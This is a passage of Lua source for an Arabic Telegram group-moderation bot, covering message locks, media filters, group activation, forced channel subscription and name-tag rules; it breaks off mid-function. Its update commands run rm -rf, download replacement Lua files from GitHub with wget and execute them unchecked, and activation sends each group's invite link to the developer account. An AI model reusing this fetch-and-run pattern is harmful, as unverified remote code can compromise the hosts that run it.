if database:get(bot_id.."lock:Unsupported"..msg.chat_id_) == "del" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Unsupported"..msg.chat_id_) == "ked" then
ked(msg.chat_id_,msg.sender_user_id_)
database:sadd(bot_id..'Tkeed:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Unsupported"..msg.chat_id_) == "kick" then
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Unsupported"..msg.chat_id_) == "ktm" then
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if msg.content_.entities_ then 
if msg.content_.entities_[0] then 
if msg.content_.entities_[0] and msg.content_.entities_[0].ID == "MessageEntityUrl" or msg.content_.entities_[0].ID == "MessageEntityTextUrl" then      
if not Special(msg) then
if database:get(bot_id.."lock:Markdaun"..msg.chat_id_) == "del" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Markdaun"..msg.chat_id_) == "ked" then
ked(msg.chat_id_,msg.sender_user_id_)
database:sadd(bot_id..'Tkeed:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Markdaun"..msg.chat_id_) == "kick" then
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Markdaun"..msg.chat_id_) == "ktm" then
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end  
end 
end
end 
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if msg.content_.ID == 'MessageContact' and not Special(msg) then      
if database:get(bot_id.."lock:Contact"..msg.chat_id_) == "del" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Contact"..msg.chat_id_) == "ked" then
ked(msg.chat_id_,msg.sender_user_id_)
database:sadd(bot_id..'Tkeed:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Contact"..msg.chat_id_) == "kick" then
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Contact"..msg.chat_id_) == "ktm" then
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if BasicConstructor(msg) then 
if (msg.content_.ID == "MessagePhoto" or msg.content_.ID == "MessageSticker" or msg.content_.ID == "MessageVideo" or msg.content_.ID == "MessageAnimation" or msg.content_.ID == "MessageUnsupported") and database:get(bot_id.."LoMsg"..msg.chat_id_) then
database:sadd(bot_id..":IdMsg:"..msg.chat_id_,msg.id_)
GetTi = database:get(bot_id..':TiMsg:'..msg.chat_id_)
if GetTi then 
GetTi = tonumber(GetTi)
GetTi = 60*60*GetTi
end
database:setex(bot_id..":STiMsg:"..msg.chat_id_..msg.id_,GetTi or 21600,true)  
end
local DoTi = database:smembers(bot_id..":IdMsg:"..msg.chat_id_)
for k,v in pairs(DoTi) do
if not database:get(bot_id..":STiMsg:"..msg.chat_id_..v) then
DeleteMessage(msg.chat_id_, {[0] = v}) 
database:srem(bot_id..":IdMsg:"..msg.chat_id_,v)
end
end
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if msg.content_.text_ and not Special(msg) then  
local _nl, ctrl_ = string.gsub(text, '%c', '')  
local _nl, real_ = string.gsub(text, '%d', '')   
sens = 400  
if database:get(bot_id.."lock:Spam"..msg.chat_id_) == "del" and string.len(msg.content_.text_) > (sens) or ctrl_ > (sens) or real_ > (sens) then 
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Spam"..msg.chat_id_) == "ked" and string.len(msg.content_.text_) > (sens) or ctrl_ > (sens) or real_ > (sens) then 
ked(msg.chat_id_,msg.sender_user_id_)
database:sadd(bot_id..'Tkeed:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Spam"..msg.chat_id_) == "kick" and string.len(msg.content_.text_) > (sens) or ctrl_ > (sens) or real_ > (sens) then 
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Spam"..msg.chat_id_) == "ktm" and string.len(msg.content_.text_) > (sens) or ctrl_ > (sens) or real_ > (sens) then 
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
if msg.content_.ID == 'MessageSticker' and not Manager(msg) then 
local filter = database:smembers(bot_id.."filtersteckr"..msg.chat_id_)
for k,v in pairs(filter) do
if v == msg.content_.sticker_.set_id_ then
tdcli_function({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0, " ✯︙عذرا » {[@"..data.username_.."]}\n✯︙عذرا تم منع الملصق \n" ) 
else
send(msg.chat_id_,0, " ✯︙عذرا » {["..data.first_name_.."](t.me/WaTaNTeaM)}\n✯︙عذرا تم منع الملصق \n" ) 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
end
end
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----

----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if msg.content_.ID == "MessagePhoto" then 
if not Manager(msg) then 
local filter = database:smembers(bot_id.."filterphoto"..msg.chat_id_)
for k,v in pairs(filter) do
if v == msg.content_.photo_.id_ then
tdcli_function({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0," ✯︙عذرا » {[@"..data.username_.."]}\n✯︙عذرا تم منع الصوره" ) 
else
send(msg.chat_id_,0," ✯︙عذرا » {["..data.first_name_.."](t.me/WaTaNTeaM)}\n✯︙عذرا تم منع الصوره \n") 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
end
end
end
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if msg.content_.ID == 'MessageAnimation' and not Manager(msg) then 
local filter = database:smembers(bot_id.."filteranimation"..msg.chat_id_)
for k,v in pairs(filter) do
if v == msg.content_.animation_.animation_.persistent_id_ then
tdcli_function({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0," ✯︙عذرا » {[@"..data.username_.."]}\n✯︙عذرا تم منع المتحركه \n") 
else
send(msg.chat_id_,0," ✯︙عذرا » {["..data.first_name_.."](t.me/WaTaNTeaM)}\n✯︙عذرا تم منع المتحركه \n" ) 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
end
end
end

if text == 'تفعيل' and ChanSub(msg) and Sudo(msg) then
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,'✯︙عذرا يرجى ترقيه البوت مشرف !')
return false  
end
tdcli_function ({ ID = "GetChannelFull", channel_id_ = getChatId(msg.chat_id_).ID }, function(arg,data)  
if tonumber(data.member_count_) < tonumber(database:get(bot_id..'Num:Add:Bot') or 0) and not DevWaTaN(msg) then
send(msg.chat_id_, msg.id_,'✯︙عدد اعضاء الكروب قليله يرجى جمع >> {'..(database:get(bot_id..'Num:Add:Bot') or 0)..'} عضو')
return false
end
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,chat)  
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,abbas) 
local admins = abbas.members_
for i=0 , #admins do
if abbas.members_[i].status_.ID == "ChatMemberStatusCreator" then
database:set(bot_id..'CoSuv'..msg.chat_id_,admins[i].user_id_)
database:sadd(bot_id..'CoSu'..msg.chat_id_,admins[i].user_id_)
database:sadd(bot_id..'Basic:Constructor'..msg.chat_id_,admins[i].user_id_)
tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_},function(arg,ba) 
if ba.first_name_ == false then
database:del(bot_id..'CoSuv'..msg.chat_id_)
database:srem(bot_id..'CoSu'..msg.chat_id_,admins[i].user_id_)
database:srem(bot_id..'Basic:Constructor'..msg.chat_id_,admins[i].user_id_)
end
end,nil)  
end 
end
end,nil)
if database:sismember(bot_id..'Chek:Groups',msg.chat_id_) then
send(msg.chat_id_, msg.id_,'✯︙بالتأكيد تم تفعيل الكروب')
else
sendText(msg.chat_id_,'\n✯︙بواسطه » ['..string.sub(result.first_name_,0, 70)..'](tg://user?id='..result.id_..')\n✯︙تم تفعيل الكروب {'..chat.title_..'}',msg.id_/2097152/0.5,'md')
database:sadd(bot_id..'Chek:Groups',msg.chat_id_)
local Name = '['..result.first_name_..'](tg://user?id='..result.id_..')'
local NameChat = chat.title_
local IdChat = msg.chat_id_
local NumMember = data.member_count_
local linkgpp = json:decode(https.request('https://api.telegram.org/bot'..token..'/exportChatInviteLink?chat_id='..msg.chat_id_))
if linkgpp.ok == true then 
LinkGp = linkgpp.result
else
LinkGp = 'لا يوجد'
end
database:set(bot_id.."Private:Group:Link"..msg.chat_id_,LinkGp)
Text = '✯︙تم تفعيل كروب جديده\n'..
'\n✯︙بواسطة {'..Name..'}'..
'\n✯︙ايدي الكروب {'..IdChat..'}'..
'\n✯︙اسم الكروب {['..NameChat..']}'..
'\n✯︙عدد اعضاء الكروب *{'..NumMember..'}*'..
'\n✯︙الرابط {['..LinkGp..']}'
if not DevWaTaN(msg) then
sendText(SUDO,Text,0,'md')
end
end
end,nil) 
end,nil) 
end,nil)
end
if text == 'تعطيل' and ChanSub(msg) and Sudo(msg) then
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,chat)  
if not database:sismember(bot_id..'Chek:Groups',msg.chat_id_) then
send(msg.chat_id_, msg.id_,'✯︙بالتأكيد تم تعطيل الكروب')
else
sendText(msg.chat_id_,'\n✯︙بواسطه » ['..string.sub(result.first_name_,0, 70)..'](tg://user?id='..result.id_..')\n✯︙تم تعطيل الكروب {'..chat.title_..'}',msg.id_/2097152/0.5,'md')
database:srem(bot_id..'Chek:Groups',msg.chat_id_)  
local Name = '['..result.first_name_..'](tg://user?id='..result.id_..')'
local NameChat = chat.title_
local IdChat = msg.chat_id_
local AddPy = var
local linkgpp = json:decode(https.request('https://api.telegram.org/bot'..token..'/exportChatInviteLink?chat_id='..msg.chat_id_))
if linkgpp.ok == true then 
LinkGp = linkgpp.result
else
LinkGp = 'لا يوجد'
end
Text = '\nتم تعطيل الكروب  ✯︙'..
'\n✯︙بواسطة {'..Name..'}'..
'\n✯︙ايدي الكروب {'..IdChat..'}'..
'\n✯︙اسم الكروب {['..NameChat..']}'..
'\n✯︙الرابط {['..LinkGp..']}'
if not DevWaTaN(msg) then
sendText(SUDO,Text,0,'md')
end
end
end,nil) 
end,nil) 
end
if text == 'تفعيل' and ChanSub(msg) and not Sudo(msg) and not database:get(bot_id..'Free:Bots') then
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,'✯︙عذرا يرجى ترقيه البوت مشرف !')
return false  
end
tdcli_function ({ ID = "GetChannelFull", channel_id_ = getChatId(msg.chat_id_).ID }, function(arg,data)  
if tonumber(data.member_count_) < tonumber(database:get(bot_id..'Num:Add:Bot') or 0) and not DevWaTaN(msg) then
send(msg.chat_id_, msg.id_,'✯︙عدد اعضاء الكروب قليله يرجى جمع >> {'..(database:get(bot_id..'Num:Add:Bot') or 0)..'} عضو')
return false
end
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,chat)  
tdcli_function ({ID = "GetChatMember",chat_id_ = msg.chat_id_,user_id_ = msg.sender_user_id_},function(arg,da) 
if da and da.status_.ID == "ChatMemberStatusEditor" or da and da.status_.ID == "ChatMemberStatusCreator" then
if da and da.user_id_ == msg.sender_user_id_ then
if da.status_.ID == "ChatMemberStatusCreator" then
var = 'المالك'
elseif da.status_.ID == "ChatMemberStatusEditor" then
var = 'مشرف'
end
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,abbas) 
local admins = abbas.members_
for i=0 , #admins do
if abbas.members_[i].status_.ID == "ChatMemberStatusCreator" then
database:set(bot_id..'CoSuv'..msg.chat_id_,admins[i].user_id_)
database:sadd(bot_id..'CoSu'..msg.chat_id_,admins[i].user_id_)
database:sadd(bot_id..'Basic:Constructor'..msg.chat_id_,admins[i].user_id_)
tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_},function(arg,ba) 
if ba.first_name_ == false then
database:del(bot_id..'CoSuv'..msg.chat_id_)
database:srem(bot_id..'CoSu'..msg.chat_id_,admins[i].user_id_)
database:srem(bot_id..'Basic:Constructor'..msg.chat_id_,admins[i].user_id_)
end
end,nil)  
end 
end
end,nil)
if database:sismember(bot_id..'Chek:Groups',msg.chat_id_) then
send(msg.chat_id_, msg.id_,'✯︙تم تفعيل الكروب')
else
sendText(msg.chat_id_,'\n✯︙بواسطه » ['..string.sub(result.first_name_,0, 70)..'](tg://user?id='..result.id_..')\n✯︙تم تفعيل الكروب {'..chat.title_..'}',msg.id_/2097152/0.5,'md')
database:sadd(bot_id..'Chek:Groups',msg.chat_id_)  
local Name = '['..result.first_name_..'](tg://user?id='..result.id_..')'
local NumMember = data.member_count_
local NameChat = chat.title_
local IdChat = msg.chat_id_
local AddPy = var
local linkgpp = json:decode(https.request('https://api.telegram.org/bot'..token..'/exportChatInviteLink?chat_id='..msg.chat_id_))
if linkgpp.ok == true then 
LinkGp = linkgpp.result
else
LinkGp = 'لا يوجد'
end
database:set(bot_id.."Private:Group:Link"..msg.chat_id_,LinkGp)
Text = '✯︙تم تفعيل كروب جديده\n'..
'\n✯︙بواسطة {'..Name..'}'..
'\n✯︙موقعه في الكروب {'..AddPy..'}' ..
'\n✯︙ايدي الكروب {'..IdChat..'}'..
'\n✯︙عدد اعضاء الكروب *{'..NumMember..'}*'..
'\n✯︙اسم الكروب {['..NameChat..']}'..
'\n✯︙الرابط {['..LinkGp..']}'
if not DevWaTaN(msg) then
sendText(SUDO,Text,0,'md')
end
end
end
end
end,nil)   
end,nil) 
end,nil) 
end,nil)
end
if text and text:match("^ضع عدد الاعضاء (%d+)$") and ChanSub(msg) and DevWaTaN(msg) then
local Num = text:match("ضع عدد الاعضاء (%d+)$") 
database:set(bot_id..'Num:Add:Bot',Num) 
send(msg.chat_id_, msg.id_,'✯︙تم تعيين عدد الاعضاء سيتم تفعيل الكروبات التي اعضائها اكثر من  >> {'..Num..'} عضو')
end
if text == 'تحديث السورس' and ChanSub(msg) and DevWaTaN(msg) then 
local url,res = https.request('https://api-watan.ml/ch/joinch.php?id='..msg.sender_user_id_)
data = JSON.decode(url)
if data.Ch_Member.Info_WaTaNTeaM ~= true then
send(msg.chat_id_,msg.id_,'✯︙اهلا بك عزيزي ،\n✯︙اشترك في قناة السورس\n✯︙ثم ارسل الامر مره اخرى\n✯︙قناة السورس @WaTaNTeaM')   
return false 
end
send(msg.chat_id_, msg.id_,'✯︙جارٍ الان تحديث السورس الى اخر اصدار')
os.execute('rm -rf WaTaN.lua')
os.execute('wget https://raw.githubusercontent.com/WaTaNtEaM/WaTaN/main/WaTaN.lua')
send(msg.chat_id_, msg.id_,'✯︙تم تحديث السورس \n✯︙لديك اخر اصدار لسورس وطن\n✯︙الاصدار » { v 3.2 }')
dofile('WaTaN.lua')  
end
if text == 'تحديث المتجر' and ChanSub(msg) and DevWaTaN(msg) then 
local url,res = https.request('https://api-watan.ml/ch/joinch.php?id='..msg.sender_user_id_)
data = JSON.decode(url)
if data.Ch_Member.Info_WaTaNTeaM ~= true then
send(msg.chat_id_,msg.id_,'✯︙اهلا بك عزيزي ،\n✯︙اشترك في قناة السورس\n✯︙ثم ارسل الامر مره اخرى\n✯︙قناة السورس @WaTaNTeaM')   
return false 
end
io.popen("mkdir File_Bot")
os.execute("rm -fr File_Bot/*")
io.popen("cd File_Bot && wget https://raw.githubusercontent.com/WaTaNtEaM/Files_Watan/main/File_Bot/all.lua") 
io.popen("cd File_Bot && wget https://raw.githubusercontent.com/WaTaNtEaM/Files_Watan/main/File_Bot/Reply.lua")  
io.popen("cd File_Bot && wget https://raw.githubusercontent.com/WaTaNtEaM/Files_Watan/main/File_Bot/games.lua") 
send(msg.chat_id_, msg.id_,'✯︙اهلا بك عزيزي\n✯︙تم تنزيل جميع ملفات المتجر وتحديثه الى اخر اصدار\n✯︙تابعنا لتصلك اخر التحديثات\n✯︙[قناة السورس](t.me/WaTaNTeaM)')
dofile('WaTaN.lua') 
end
if text == "تعيين قناة الاشتراك" and DevWaTaN(msg) and ChanSub(msg) then
if not DevWaTaN(msg) then
send(msg.chat_id_, msg.id_,'✯︙للمطور الاساسي فقط')
else
database:setex(bot_id..'database4'..msg.sender_user_id_,360,true)
send(msg.chat_id_, msg.id_,'✯︙ارسل معرف القناة الان')
end
return false  
end
if text == "تفعيل الاشتراك الاجباري" and DevWaTaN(msg) and ChanSub(msg) then  
if not DevWaTaN(msg) then
send(msg.chat_id_, msg.id_,'✯︙للمطور الاساسي فقط')
else
if database:get(bot_id..'Abs:ChId') then
local Check = https.request('https://api.telegram.org/bot'..token..'/getChat?chat_id='..database:get(bot_id.."Abs:ChId"))
local GetInfo = JSON.decode(Check)
send(msg.chat_id_, msg.id_,"✯︙الاشتراك الاجباري مفعل \n✯︙على القناة ↫ [@"..GetInfo.result.username.."]")
else
database:setex(bot_id..'database4'..msg.sender_user_id_,360,true)
send(msg.chat_id_, msg.id_,"✯︙اهلا عزيزي المطور \n✯︙ارفع البوت مشرف في قناتك \n✯︙ثم ارسل معرف قناتك\n✯︙مثال على معرف القناة @watanteam")
end
end
return false  
end
if text == "تعطيل الاشتراك الاجباري" and DevWaTaN(msg) and ChanSub(msg) then
if not DevWaTaN(msg) then
send(msg.chat_id_, msg.id_,'✯︙للمطور الاساسي فقط')
else
database:del(bot_id..'Abs:ChId')
send(msg.chat_id_, msg.id_,'✯︙تم تعطيل الاشتراك الاجباري')
end
end
if text == "حذف قناة الاشتراك" and DevWaTaN(msg) and ChanSub(msg) then
if not DevWaTaN(msg) then
send(msg.chat_id_, msg.id_,'✯︙للمطور الاساسي فقط')
else
database:del(bot_id..'Abs:ChId')
send(msg.chat_id_, msg.id_,'✯︙تم حذف قناة')
end
end
if DevWaTaN(msg) then
if text == 'جلب قناة الاشتراك' and DevWaTaN(msg) and ChanSub(msg) then
if database:get(bot_id..'Abs:ChId') then
local Check = https.request('https://api.telegram.org/bot'..token..'/getChat?chat_id='..database:get(bot_id.."Abs:ChId"))
local GetInfo = JSON.decode(Check)
send(msg.chat_id_, msg.id_, "✯︙قناة الاشتراك ↫ [@"..GetInfo.result.username.."]")
else
send(msg.chat_id_, msg.id_, "✯︙لاتوجد قناة في الاشتراك الاجباري")
end
return false  
end end
if text == "تفعيل الاضافات" and ChanSub(msg) and Constructor(msg) then
send(msg.chat_id_, msg.id_, '✯︙تم تفعيل الاضافات')
database:set(bot_id.."AL:AddWaTaN:stats","✔")
end
if text == "تعطيل الاضافات" and ChanSub(msg) and Constructor(msg) then
send(msg.chat_id_, msg.id_, '✯︙تم تعطيل الاضافات')
database:set(bot_id.."AL:AddWaTaN:stats","✖")
end
if text == "حاله الاضافات" and ChanSub(msg) and Constructor(msg) then
local MRWaTaN = database:get(bot_id.."AL:AddWaTaN:stats") or "لم يتم التحديد"
send(msg.chat_id_, msg.id_,"حاله الاضافات هي : {"..MRWaTaN.."}\nاذا كانت {✔} الاضافات مفعله\nاذا كانت {✖} الاضافات معطله")
end
function bnnaGet(user_id, cb)
tdcli_function ({
ID = "GetUser",
user_id_ = user_id
}, cb, nil)
end

if database:get(bot_id.."block:name:stats"..msg.chat_id_) == "open" then
if text and text:match("^كتم اسم (.*)$") and ChanSub(msg) and Manager(msg) and database:get(bot_id.."block:name:stats"..msg.chat_id_) == "open" then
local BlNe = text:match("^كتم اسم (.*)$")
send(msg.chat_id_, msg.id_, '✯︙تم كتم الاسم '..BlNe)
database:sadd(bot_id.."WaTaN:blocname"..msg.chat_id_, BlNe)
end

if text and text:match("^الغاء كتم اسم (.*)$") and ChanSub(msg) and Manager(msg) and database:get(bot_id.."block:name:stats"..msg.chat_id_) == "open" then
local delBn = text:match("^الغاء كتم اسم (.*)$")
send(msg.chat_id_, msg.id_, '✯︙تم الغاء كتم الاسم '..delBn)
database:srem(bot_id.."WaTaN:blocname"..msg.chat_id_, delBn)
end

if text == "مسح الاسماء المكتومه" and ChanSub(msg) and Constructor(msg) and database:get(bot_id.."block:name:stats"..msg.chat_id_) == "open" then
database:del(bot_id.."WaTaN:blocname"..msg.chat_id_)
texts = "✯︙تم مسح الاسماء المكتومه "
send(msg.chat_id_, msg.id_, texts)
end
if text == "الاسماء المكتومه" and ChanSub(msg) and Constructor(msg) and database:get(bot_id.."block:name:stats"..msg.chat_id_) == "open" then
local All_name = database:smembers(bot_id.."WaTaN:blocname"..msg.chat_id_)
t = "\n✯︙قائمة الاسماء المكتومه \nٴ≪━━━━ 𝐖𝐀𝐓𝐀𝐍 ━━━━≫ٴ \n"
for k,v in pairs(All_name) do
t = t..""..k.."- (["..v.."])\n"
end
if #All_name == 0 then
t = "✯︙لا يوجد اسماء مكتومه"
end
send(msg.chat_id_, msg.id_, t)
end
end
if text == "تفعيل كتم الاسم" and ChanSub(msg) and Constructor(msg) and database:get(bot_id.."AL:AddWaTaN:stats") == "✔" then
send(msg.chat_id_, msg.id_, '✯︙تم التفعيل الاسماء المكتومه')
database:set(bot_id.."block:name:stats"..msg.chat_id_,"open")
end
if text == "تعطيل كتم الاسم" and ChanSub(msg) and Constructor(msg) and database:get(bot_id.."AL:AddWaTaN:stats") == "✔" then
send(msg.chat_id_, msg.id_, '✯︙تم تعطيل الاسماء المكتومه')
database:set(bot_id.."block:name:stats"..msg.chat_id_,"close")
end
if not Manager(msg) and database:get(bot_id.."block:name:stats"..msg.chat_id_) == "open" then
function abbas_name(t1,t2)
if t2.id_ then 
name_MRWaTaN = ((t2.first_name_ or "") .. (t2.last_name_ or ""))
if name_MRWaTaN then 
names_MRWaTaN = database:smembers(bot_id.."WaTaN:blocname"..msg.chat_id_) or ""
if names_MRWaTaN and names_MRWaTaN[1] then 
for i=1,#names_MRWaTaN do 
if name_MRWaTaN:match("(.*)("..names_MRWaTaN[i]..")(.*)") then 
DeleteMessage_(msg.chat_id_,{[0] = msg.id_}) 
end
end
end
end
end
end
bnnaGet(msg.sender_user_id_, abbas_name)
end
if database:get(bot_id.."kt:twh:stats"..msg.chat_id_) == "open" then
if text and text:match("^وضع توحيد (.*)$") and ChanSub(msg) and Manager(msg) and database:get(bot_id.."kt:twh:stats"..msg.chat_id_) == "open" then
local teh = text:match("^وضع توحيد (.*)$")
send(msg.chat_id_, msg.id_,'✯︙تم تعيين '..teh..' كتوحيد للمجموعه')
database:set(bot_id.."WaTaN:teh"..msg.chat_id_,teh)
end
if text and text:match("^تعين عدد الكتم (.*)$") and ChanSub(msg) and Manager(msg) and database:get(bot_id.."kt:twh:stats"..msg.chat_id_) == "open" then
local nump = text:match("^تعين عدد الكتم (.*)$")
send(msg.chat_id_, msg.id_,'✯︙تم تعين  '..nump..' عدد الكتم')
database:set(bot_id.."WaTaN:nump"..msg.chat_id_,nump)
end
if text == "التوحيد" then
local s1 = database:get(bot_id.."WaTaN:teh"..msg.chat_id_) or "لا يوجد توحيد"
local s2 = database:get(bot_id.."WaTaN:nump"..msg.chat_id_) or 5
send(msg.chat_id_, msg.id_,'✯︙التوحيد '..s1..'\n✯︙عدد الكتم  : '..s2)
end
end
if text == "تفعيل التوحيد" and ChanSub(msg) and Constructor(msg) and database:get(bot_id.."AL:AddWaTaN:stats") == "✔" then
send(msg.chat_id_, msg.id_, '✯︙تم تفعيل التوحيد')
database:set(bot_id.."kt:twh:stats"..msg.chat_id_,"open")
end
if text == "تعطيل التوحيد" and ChanSub(msg) and Constructor(msg) and database:get(bot_id.."AL:AddWaTaN:stats") == "✔" then
send(msg.chat_id_, msg.id_, '✯︙تم تعطيل التوحيد')
database:set(bot_id.."kt:twh:stats"..msg.chat_id_,"close")
end
if not Constructor(msg) then
if database:get(bot_id.."kt:twh:stats"..msg.chat_id_) == "open" and database:get(bot_id.."WaTaN:teh"..msg.chat_id_) then 
id = msg.sender_user_id_
function WaTaN_mrWaTaN_new(mrWaTaN1,mrWaTaN2)
if mrWaTaN2 and mrWaTaN2.first_name_ then 
if mrWaTaN2.first_name_:match("(.*)"..database:get(bot_id.."WaTaN:teh"..msg.chat_id_).."(.*)") then 
database:srem(bot_id.."WaTaN:Muted:User"..msg.chat_id_, msg.sender_user_id_)
else
local mrWaTaN_nnn = database:get(bot_id.."WaTaN:nump"..msg.chat_id_) or 5
local mrWaTaN_nnn2 = database:get(bot_id.."WaTaN:nump22"..msg.chat_id_..msg.sender_user_id_) or 0
if (tonumber(mrWaTaN_nnn2) == tonumber(mrWaTaN_nnn) or tonumber(mrWaTaN_nnn2) > tonumber(mrWaTaN_nnn)) then 
database:sadd(bot_id..'Muted:User'..msg.chat_id_, msg.sender_user_id_)
else 
database:incrby(bot_id.."WaTaN:nump22"..msg.chat_id_..msg.sender_user_id_,1)
send(msg.chat_id_, msg.id_, "✯︙عزيزي >>["..mrWaTaN2.username_.."](https://t.me/"..(mrWaTaN2.username_ or "WaTaNTeaM")..")\n✯︙عليك وضع التوحيد ⪼ {"..database:get(bot_id.."WaTaN:teh"..msg.chat_id_).."} بجانب اسمك\n✯︙عدد المحاولات المتبقيه {"..(tonumber(mrWaTaN_nnn) - tonumber(mrWaTaN_nnn2)).."}")
end
end
end
end
bnnaGet(id, WaTaN_mrWaTaN_new)
end
end
if text == "تفعيل تنبيه الاسماء" and ChanSub(msg) and Manager(msg) and database:get(bot_id.."AL:AddWaTaN:stats") == "✔" then
send(msg.chat_id_, msg.id_, '✯︙تم تفعيل تنبيه الاسماء')
database:set(bot_id.."Ttn:WtN:stats"..msg.chat_id_,"open")
end
if text == "تعطيل تنبيه الاسماء" and ChanSub(msg) and Manager(msg) and database:get(bot_id.."AL:AddWaTaN:stats") == "✔" then
send(msg.chat_id_, msg.id_, '✯︙تم تعطيل تنبيه الاسماء')
database:set(bot_id.."Ttn:WtN:stats"..msg.chat_id_,"close")
end
if text and database:get(bot_id.."Ttn:WtN:stats"..msg.chat_id_) == "open" then 
tdcli_function({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data)
if data.id_ then 
if data.id_ ~= bot_id then
local WaTaNChengName = database:get(bot_id.."WaTaN:Cheng:Name"..data.id_)
if not data.first_name_ then 
if WaTaNChengName then 
send(msg.chat_id_, msg.id_, " خوش معرف جان ["..WaTaNChengName..']')
database:del(bot_id.."WaTaN:Cheng:Name"..data.id_) 
end
end
if data.first_name_ then 
if WaTaNChengName ~= data.first_name_ then 
local Text = {
  "جان خوش اسم يول",
"ليش غيرته اسمك بس لا خانوك/ج",
"هذا الحلو غير اسمه 😉",
}
send(msg.chat_id_, msg.id_,Text[math.random(#Text)])
end  
database:set(bot_id.."WaTaN:Cheng:Name"..data.id_, data.first_name_) 
end
end
end
end,nil)   
end
if text == "تفعيل تنبيه المعرف" and ChanSub(msg) and Constructor(msg) and database:get(bot_id.."AL:AddWaTaN:stats") == "✔" then
send(msg.chat_id_, msg.id_, '✯︙تم تفعيل تنبيه المعرف')
database:set(bot_id.."Ttn:Userr:stats"..msg.chat_id_,"open")
end
if text == "تعطيل تنبيه المعرف" and ChanSub(msg) and Constructor(msg) and database:get(bot_id.."AL:AddWaTaN:stats") == "✔" then
send(msg.chat_id_, msg.id_, '✯︙تم تعطيل تنبيه المعرف')
database:set(bot_id.."Ttn:Userr:stats"..msg.chat_id_,"close")
end
if text and database:get(bot_id.."Ttn:Userr:stats"..msg.chat_id_) == "open" then  
tdcli_function({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data)
if data.id_ then 
if data.id_ ~= bot_id then
local WaTaNChengUserName = database:get(bot_id.."WaTaN:Cheng:UserName"..data.id_)
if not data.username_ then 
if WaTaNChengUserName then 
